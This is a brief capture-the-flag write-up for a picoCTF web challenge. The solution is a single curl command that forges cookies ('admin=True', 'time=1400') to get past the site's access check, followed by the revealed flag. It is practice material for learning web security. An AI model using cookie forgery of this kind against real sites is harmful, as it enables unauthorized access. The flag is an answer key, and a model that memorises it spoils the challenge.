Are you a master of the cookies??

***Challenge Statement***
This secure website allows users to access the flag only if 
they are "admin" and if the "time" is exactly 1400. 
https://2019shell1.picoctf.com/problem/12276/ 

Hint 1  : Check out an extension called edit this cookie on a chrome browser
(Or learn about the "curl" command)


>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.
>>>>curl "https://2019shell1.picoctf.com/problem/12276/flag" -H "Cookie: time=1400; admin=True;" -s | grep picoCTF
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{0p3n_t0_adm1n5_dcb566bb}</code></p>
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
flag = picoCTF{0p3n_t0_adm1n5_dcb566bb}


